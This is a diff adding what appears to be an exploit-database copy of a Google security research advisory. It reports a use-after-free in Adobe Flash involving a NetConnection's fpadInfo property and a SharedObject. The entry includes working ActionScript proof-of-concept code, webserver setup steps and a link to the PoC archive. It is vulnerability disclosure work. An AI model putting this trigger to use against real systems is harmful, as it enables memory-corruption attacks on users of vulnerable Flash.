@@ -1,0 +1,33 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=352&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+If the fpadInfo property of a NetConnection object is a SharedObject, a use-after-free occurs when the property is deleted. A proof-of-concept is as follows:
+
+var s = SharedObject.getLocal("test");
+
+ASSetPropFlags(s, null, 0, 0xff);
+ASSetPropFlags(s.data, null, 0, 0xff);
+var q = {myprop  :"natalie", myprop2 : "test"};
+s.data.fpadInfo = q;
+s.flush();
+var n = new NetConnection();
+ASnative(2100, 200)(s.data);
+n.connect.call(s.data, "");
+trace(s.data.fpadInfo);
+s = 1;
+
+//GC happens here
+
+setInterval(f, 1000);
+
+function f(){
+
+	ASnative(252, 1).call(q); //Array push
+	delete q.myprop;
+	
+	}
+
+A fla, an AS file and two swfs are attached. shareddelete.fla compiles to shareddelete.swf and contains the code that causes the use-after-free. loadswf.as compiles to loadswf.swf, and sets up the heap to cause a crash. To make the issue occur, put loadswf.swf and shareddelete.swf in the same folder on a webserver (the PoCs don't always work locally due to flash network sandboxing), and load loadswf.swf. This PoC only works on 64-bit systems, but the issue would work on a 32-bit system with proper heap set-up. 
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37850.zip
+
